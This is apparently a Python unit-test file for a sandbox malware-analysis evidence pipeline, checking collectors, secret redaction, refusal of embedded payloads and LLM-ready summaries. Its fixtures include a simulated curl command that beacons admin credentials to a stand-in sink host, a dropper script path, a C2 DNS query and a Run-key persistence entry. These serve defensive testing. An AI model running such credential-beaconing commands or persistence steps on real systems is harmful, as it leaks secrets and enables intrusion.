from __future__ import annotations

import hashlib
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "platform" / "src"))

from ai_lab_platform.security import (
    COLLECTOR_CATEGORIES,
    CollectorResult,
    EvidenceBundle,
    EvidenceRef,
    ViseEvidencePipeline,
    collect_dns_metadata,
    collect_filesystem_delta,
    collect_hashes,
    collect_memory_analysis,
    collect_network_metadata,
    collect_pcap_reference,
    collect_process_tree,
    collect_registry_delta,
    collect_screenshot_reference,
    collect_static_metadata,
    collect_yara_results,
    summarize_evidence_for_llm,
)
from ai_lab_platform.security.events import EmbeddedPayloadRefused
from ai_lab_platform.security.vise import ViseStore


class TestViseEvidencePipeline(unittest.TestCase):
    """Verifies evidence collection, normalization, safety boundaries, and degradation."""

    def setUp(self) -> None:
        self.job_id = "test-job-7401-deadbeef"
        self.pipeline = ViseEvidencePipeline(quarantine_base="quarantine://evidence")
        self.sample_telemetry = {
            "hashes": {
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "md5": "d41d8cd98f00b204e9800998ecf8427e",
                "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
                "ssdeep": "3:h:h",
            },
            "processes": [
                {
                    "pid": 100,
                    "ppid": 1,
                    "name": "systemd",
                    "cmdline": "/lib/systemd/systemd --system",
                    "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
                    "suspicious": False,
                },
                {
                    "pid": 1337,
                    "ppid": 100,
                    "name": "curl",
                    "cmdline": "curl -u admin:super_secret_password https://isolated-sink.local/beacon",
                    "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
                    "suspicious": True,
                },
            ],
            "filesystem": [
                {
                    "path": "/tmp/dropper.sh",
                    "action": "created",
                    "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
                    "size_bytes": 1024,
                }
            ],
            "dns": [
                {
                    "query": "c2-sink.lab",
                    "qtype": "A",
                    "resolved_ips": ["127.0.0.1"],
                    "blocked": True,
                }
            ],
            "network": [
                {
                    "proto": "tcp",
                    "dest_ip": "10.99.0.5",
                    "dest_port": 443,
                    "bytes_out": 256,
                    "bytes_in": 0,
                    "egress_dropped": True,
                }
            ],
            "pcap": {
                "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
                "byte_length": 8192,
                "packet_count": 42,
            },
            "yara": [
                {
                    "rule": "Suspicious_Bash_Dropper",
                    "namespace": "threat_intel",
                    "tags": ["dropper", "linux"],
                    "target_path": "/tmp/dropper.sh",
                }
            ],
            "static": {
                "format": "ELF",
                "architecture": "x86_64",
                "entrypoint": "0x401000",
                "sections": [".text", ".data", ".rodata"],
                "imported_dlls": ["libc.so.6"],
                "compile_timestamp": "2026-10-31T00:00:00Z",
            },
            "memory": {
                "sha256": "5555555555555555555555555555555555555555555555555555555555555555",
                "byte_length": 1048576,
                "findings": ["Injected code found in PID 1337", "Hidden thread detected"],
                "plugins_run": ["linux_pslist", "linux_check_modules"],
            },
            "screenshot": {
                "sha256": "6666666666666666666666666666666666666666666666666666666666666666",
                "byte_length": 65536,
                "resolution": "1920x1080",
            },
        }

    def test_collector_categories_defined(self) -> None:
        """Verifies standard collector categories are enumerated."""
        self.assertIn("process_tree", COLLECTOR_CATEGORIES)
        self.assertIn("filesystem_delta", COLLECTOR_CATEGORIES)
        self.assertIn("registry_delta", COLLECTOR_CATEGORIES)
        self.assertIn("dns_metadata", COLLECTOR_CATEGORIES)
        self.assertIn("network_metadata", COLLECTOR_CATEGORIES)
        self.assertIn("pcap_reference", COLLECTOR_CATEGORIES)
        self.assertIn("hashes", COLLECTOR_CATEGORIES)
        self.assertIn("static_metadata", COLLECTOR_CATEGORIES)
        self.assertIn("yara_results", COLLECTOR_CATEGORIES)
        self.assertIn("screenshots", COLLECTOR_CATEGORIES)
        self.assertIn("memory_analysis", COLLECTOR_CATEGORIES)

    def test_ac1_collector_fixtures_normalize_to_standard_evidence_schema(self) -> None:
        """AC 1: Collector fixtures normalize to the standard EvidenceRef schema."""
        bundle = self.pipeline.run_pipeline(
            job_id=self.job_id,
            profile="linux-behavioral",
            raw_telemetry=self.sample_telemetry,
        )

        self.assertIsInstance(bundle, EvidenceBundle)
        self.assertEqual(bundle.job_id, self.job_id)
        self.assertEqual(bundle.profile, "linux-behavioral")
        self.assertTrue(len(bundle.evidence_refs) > 0)
        self.assertTrue(len(bundle.digest_sha256) == 64)

        for ref in bundle.evidence_refs:
            self.assertIsInstance(ref, EvidenceRef)
            self.assertTrue(ref.locator.startswith("quarantine://evidence/"))
            self.assertEqual(len(ref.sha256), 64)
            self.assertGreaterEqual(ref.byte_length, 0)
            self.assertIn("/", ref.media_type)

            ref_dict = ref.to_dict()
            self.assertEqual(ref_dict["evidence_id"], ref.evidence_id)
            self.assertEqual(ref_dict["locator"], ref.locator)

        # Process tree collector result verification
        proc_result = bundle.results_by_collector["process_tree"]
        self.assertEqual(proc_result.status, "success")
        self.assertEqual(proc_result.category, "process_tree")
        self.assertIn("Suspicious processes detected: 1", proc_result.summary)
        # Redaction check in cmdline
        cmdline = proc_result.structured_data["processes"][1]["cmdline"]
        self.assertNotIn("super_secret_password", cmdline)
        self.assertIn("[REDACTED]", cmdline)

        # Hashes result verification
        hash_result = bundle.results_by_collector["hashes"]
        self.assertEqual(hash_result.status, "success")
        self.assertEqual(hash_result.structured_data["sha256"], self.sample_telemetry["hashes"]["sha256"])

        # Static analysis result verification
        static_result = bundle.results_by_collector["static_metadata"]
        self.assertEqual(static_result.status, "success")
        self.assertEqual(static_result.structured_data["format"], "ELF")

        # Memory analysis result verification
        mem_result = bundle.results_by_collector["memory_analysis"]
        self.assertEqual(mem_result.status, "success")
        self.assertIn("Injected code found in PID 1337", mem_result.structured_data["findings"])

    def test_ac2_graceful_degradation_missing_and_unsupported_collectors(self) -> None:
        """AC 2: Missing or unsupported collectors degrade gracefully without errors."""
        # 1. On Linux profile, registry_delta collector returns 'unsupported'
        bundle_linux = self.pipeline.run_pipeline(
            job_id=self.job_id,
            profile="linux-static",
            raw_telemetry={},
        )
        reg_result = bundle_linux.results_by_collector["registry_delta"]
        self.assertEqual(reg_result.status, "unsupported")
        self.assertIn("unsupported on non-Windows", reg_result.summary)

        # Missing collectors return 'skipped'
        for col_name in ["process_tree", "filesystem_delta", "dns_metadata", "pcap_reference", "screenshots", "hashes"]:
            res = bundle_linux.results_by_collector[col_name]
            self.assertEqual(res.status, "skipped", f"Expected {col_name} to be skipped")

        # 2. On Windows profile with registry data, registry_delta succeeds
        win_telemetry = {
            "registry": [
                {
                    "key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                    "value_name": "PersistenceKey",
                    "action": "set",
                    "value_type": "REG_SZ",
                }
            ]
        }
        bundle_win = self.pipeline.run_pipeline(
            job_id="win-job-7402",
            profile="windows-behavioral",
            raw_telemetry=win_telemetry,
        )
        reg_win_result = bundle_win.results_by_collector["registry_delta"]
        self.assertEqual(reg_win_result.status, "success")
        self.assertEqual(len(reg_win_result.structured_data["entries"]), 1)

        # 3. Malformed collector inputs fail cleanly without unhandled exceptions
        malformed_pcap = {"pcap": "not-a-dict"}
        res_malformed_pcap = collect_pcap_reference("job-fail", malformed_pcap)
        self.assertEqual(res_malformed_pcap.status, "failed")
        self.assertIn("Invalid pcap metadata", res_malformed_pcap.error)

        malformed_screenshot = {"screenshot": 12345}
        res_malformed_screenshot = collect_screenshot_reference("job-fail", malformed_screenshot)
        self.assertEqual(res_malformed_screenshot.status, "failed")
        self.assertIn("Invalid screenshot metadata", res_malformed_screenshot.error)

    def test_ac3_suspicious_binary_bytes_strictly_refused_and_redacted(self) -> None:
        """AC 3: Suspicious binary bytes and payload keys are never embedded in memory structures."""
        # Test bare bytes object rejection
        with self.assertRaises(EmbeddedPayloadRefused) as ctx:
            self.pipeline.run_pipeline(
                job_id="job-bad-bytes",
                profile="linux-static",
                raw_telemetry={"suspicious_payload": b"\x90\x90\x90\x90"},
            )
        self.assertIn("raw binary bytes forbidden", str(ctx.exception))

        # Test forbidden payload keys rejection
        forbidden_keys = ["content", "bytes", "payload", "sample", "malware", "binary", "raw"]
        for key in forbidden_keys:
            bad_data = {key: "mz_executable_text"}
            with self.assertRaises(EmbeddedPayloadRefused) as ctx:
                self.pipeline.run_pipeline(
                    job_id="job-bad-key",
                    profile="linux-static",
                    raw_telemetry=bad_data,
                )
            self.assertIn("refusing embedded payload field", str(ctx.exception))

        # Verify individual collector enforces safety check directly
        with self.assertRaises(EmbeddedPayloadRefused):
            collect_filesystem_delta("job-fs", {"filesystem": [{"path": "/bad", "payload": "hex"}]})

        with self.assertRaises(EmbeddedPayloadRefused):
            collect_process_tree("job-proc", {"processes": [{"pid": 1, "sample": "evil"}]})

    def test_ac4_evidence_summarized_for_llm_without_guest_access(self) -> None:
        """AC 4: Evidence is summarized into structured markdown without granting guest access."""
        bundle = self.pipeline.run_pipeline(
            job_id=self.job_id,
            profile="linux-behavioral",
            raw_telemetry=self.sample_telemetry,
        )

        summary = bundle.llm_summary
        self.assertIsInstance(summary, str)
        self.assertIn(f"# Security Vise Evidence Brief: {self.job_id}", summary)
        self.assertIn("## Cryptographic Hashes", summary)
        self.assertIn("## Static Analysis", summary)
        self.assertIn("## Process Execution", summary)
        self.assertIn("## Filesystem Activity", summary)
        self.assertIn("## Network & DNS Telemetry", summary)
        self.assertIn("## YARA Signatures Matched", summary)
        self.assertIn("## Volatile Memory Analysis", summary)
        self.assertIn("## Visual Telemetry", summary)
        self.assertIn("## Quarantine Artifact References", summary)

        # Verify no secrets leak into LLM summary
        self.assertNotIn("super_secret_password", summary)
        self.assertIn("[REDACTED]", summary)

        # Verify no guest command execution tokens or raw sockets
        self.assertNotIn("guest_exec", summary)
        self.assertNotIn("root@guest", summary)

    def test_vise_store_integration_with_pipeline_evidence(self) -> None:
        """Verifies EvidenceBundle references can be advanced into ViseStore collecting state."""
        store = ViseStore()
        job = store.create(
            {
                "sha256": "0" * 64,
                "byte_length": 512,
                "profile": "linux-static",
                "provider": "fake",
                "template_id": "fixture-linux",
                "execution_class": "benign",
            }
        )
        self.assertEqual(job.state, "submitted")

        # Run preflight
        store.advance(job.job_id, "preflight", actor="operator")
        self.assertEqual(job.state, "preflight")

        # Ready
        store.advance(job.job_id, "ready", actor="operator")
        self.assertEqual(job.state, "ready")

        # Running
        store.advance(job.job_id, "running", actor="operator")
        self.assertEqual(job.state, "running")

        # Collect evidence using pipeline
        bundle = self.pipeline.run_pipeline(
            job_id=job.job_id,
            profile="linux-static",
            raw_telemetry=self.sample_telemetry,
        )
        evidence_dicts = [ref.to_dict() for ref in bundle.evidence_refs]

        # Advance to collecting
        store.advance(
            job.job_id,
            "collecting",
            actor="operator",
            evidence=evidence_dicts,
            finding="Benign sample execution completed safely.",
        )
        self.assertEqual(job.state, "collecting")
        self.assertEqual(len(job.evidence), len(bundle.evidence_refs))
        self.assertEqual(job.findings, ["Benign sample execution completed safely."])

        # Cleanup and complete
        store.advance(job.job_id, "cleanup", actor="operator")
        self.assertEqual(job.state, "cleanup")
        self.assertEqual(job.cleanup_status, "verified")

        store.advance(job.job_id, "complete", actor="operator")
        self.assertEqual(job.state, "complete")


if __name__ == "__main__":
    unittest.main()
